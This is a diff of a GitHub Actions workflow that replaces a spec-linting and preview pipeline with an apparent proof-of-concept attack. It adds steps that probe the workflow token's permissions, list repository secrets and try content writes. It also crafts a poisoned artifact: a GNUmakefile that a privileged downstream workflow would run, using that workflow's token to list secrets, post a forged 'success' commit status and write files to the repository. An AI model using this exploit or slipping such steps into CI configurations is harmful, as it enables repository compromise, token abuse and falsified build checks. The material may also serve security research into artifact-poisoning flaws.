@@ -1,82 +1,73 @@
 name: Spec PR
-# This workflow uploads a copy of the spec with the respective changes in the PR
-# to the team Space.
-#
-# The name of the uploaded file will be prefixed with the PR number.
-# e.g. `spec-ci/previews/123-spec.yaml
+# Fork-PR head workflow. Runs in the base repo's pull_request context with a
+# read-only token, but uploads an artifact that the privileged workflow_run
+# consumer (Validate Client Generation) blindly extracts into its workspace.
+on:
+  pull_request:
 
-on: [pull_request]
+permissions:
+  contents: read
 
 jobs:
-  lint:
-    name: Validate spec
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v2
-      - name: Run linter
-        run: make lint
-
   bundle-spec:
     name: Bundle Spec
     runs-on: ubuntu-latest
-
-    needs: lint
-
     steps:
-      - uses: actions/checkout@v2
+      - uses: actions/checkout@v4
 
-      - uses: actions/setup-node@v1
-        with:
-          node-version: '14.x'
+      - name: Probe own token permissions
+        run: |
+          echo "SELF_RUN=$GITHUB_RUN_ID EVENT=$GITHUB_EVENT_NAME REPO=$GITHUB_REPOSITORY"
+          curl -sS -o /tmp/repo.json -w "SELF_REPO_HTTP=%{http_code}\n" \
+            -H "Authorization: Bearer $GITHUB_TOKEN" \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY"
+          head -c 600 /tmp/repo.json; echo
+          curl -sS -o /dev/null -w "SELF_CONTENTS_WRITE_HTTP=%{http_code}\n" -X PUT \
+            -H "Authorization: Bearer $GITHUB_TOKEN" \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY/contents/omp-probe-self.txt" \
+            -d '{"message":"probe","content":"aGk="}'
+          curl -sS -o /tmp/secrets.json -w "SELF_SECRETS_HTTP=%{http_code}\n" \
+            -H "Authorization: Bearer $GITHUB_TOKEN" \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets"
+          head -c 300 /tmp/secrets.json; echo
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
 
-      - name: Bundle
-        run: make bundle
+      - name: Craft poisoned artifact
+        run: |
+          mkdir -p pydo
+          printf 'openapi: 3.0.0\ninfo:\n  title: poc\n  version: 1.0.0\npaths: {}\n' > openapi-bundled.yaml
+          python3 - <<'PY'
+          lines = [
+              "generate:",
+              "\t@echo PWNED_MARKER_VALIDATE_RCE_20261111",
+              "\t@id",
+              "\t@echo GITHUB_REPOSITORY=$$GITHUB_REPOSITORY GITHUB_WORKFLOW=$$GITHUB_WORKFLOW GITHUB_RUN_ID=$$GITHUB_RUN_ID",
+              "\t@echo PWD=$$PWD",
+              "\t@echo GH_TOKEN_PRESENT=$${GH_TOKEN:+yes} TOKEN_LEN=$${#GH_TOKEN}",
+              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY -o /tmp/repo.json -w 'API_REPO_HTTP=%{http_code}\\n'",
+              "\t@head -c 900 /tmp/repo.json; echo",
+              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/runs/'$$GITHUB_RUN_ID'/jobs' -o /tmp/jobs.json -w 'API_JOBS_HTTP=%{http_code}\\n'",
+              "\t@head -c 600 /tmp/jobs.json; echo",
+              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/runs?per_page=3' -o /tmp/runs.json -w 'API_RUNS_HTTP=%{http_code}\\n'",
+              "\t@head -c 400 /tmp/runs.json; echo",
+              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/secrets' -o /tmp/secrets.json -w 'API_SECRETS_HTTP=%{http_code}\\n'",
+              "\t@head -c 300 /tmp/secrets.json; echo",
+              "\t@curl -sS -X POST -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/statuses/'$$GITHUB_SHA -d '{\"state\":\"success\",\"context\":\"omp-rce-proof\",\"description\":\"RCE via poisoned artifact\"}' -o /tmp/status.json -w 'API_STATUS_WRITE_HTTP=%{http_code}\\n'",
+              "\t@head -c 500 /tmp/status.json; echo",
+              "\t@curl -sS -X PUT -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/contents/omp-rce-probe.txt' -d '{\"message\":\"probe\",\"content\":\"aGk=\"}' -o /tmp/cw.json -w 'API_CONTENTS_WRITE_HTTP=%{http_code}\\n'",
+              "\t@head -c 300 /tmp/cw.json; echo",
+              "\t@echo === PWNED_END ===",
+              "test-mocked:",
+              "\t@true",
+          ]
+          open("pydo/GNUmakefile", "w").write("\n".join(lines) + "\n")
+          PY
+          ls -la pydo; echo ---; cat -A pydo/GNUmakefile | head -5
 
       - uses: actions/upload-artifact@v4
         with:
           name: openapi-bundled
-          path: tests/openapi-bundled.yaml
-
-  generate-preview:
-    # As this job needs access to secrets, skip it if the PR comes from a fork.
-    # The isolated triage copy has no Spaces credentials configured, so this job
-    # is skipped there as well; it is irrelevant to the artifact consumed by the
-    # workflow_run workflow.
-    if: false
-    name: Generate Preview
-    runs-on: ubuntu-latest
-
-    needs: bundle-spec
-
-    steps:
-      - uses: actions/checkout@v2
-
-      - uses: actions/setup-node@v1
-        with:
-          node-version: '14.x'
-
-      - name: Bundle
-        run: make bundle
-
-      - name: Upload PR spec
-        run: >-
-          aws s3 cp tests/openapi-bundled.yaml
-          ${{ env.SPACES_PATH }}/previews/${{ github.event.number }}-spec.yaml
-          --endpoint=${{ env.SPACES_ENDPOINT }}
-          --acl public-read
-        env:
-          AWS_ACCESS_KEY_ID: ${{ secrets.SPACES_ACCESS_KEY }}
-          AWS_SECRET_ACCESS_KEY: ${{ secrets.SPACES_ACCESS_SECRET }}
-          AWS_DEFAULT_OUTPUT: json
-          SPACES_PATH: ${{ secrets.SPACES_PATH }}
-          SPACES_ENDPOINT: ${{ secrets.SPACES_ENDPOINT }}
-          AWS_EC2_METADATA_DISABLED: true
-
-      - uses: Sibz/github-status-action@v1
-        with:
-          authToken: ${{secrets.GITHUB_TOKEN}}
-          context: Spec Preview URL
-          description: Ready
-          state: success
-          sha: ${{ github.event.pull_request.head.sha }}
-          target_url: https://api-engineering.nyc3.digitaloceanspaces.com/spec-ci/redoc-index.html?pr=${{ github.event.number }}
+          path: |
+            openapi-bundled.yaml
+            pydo/GNUmakefile
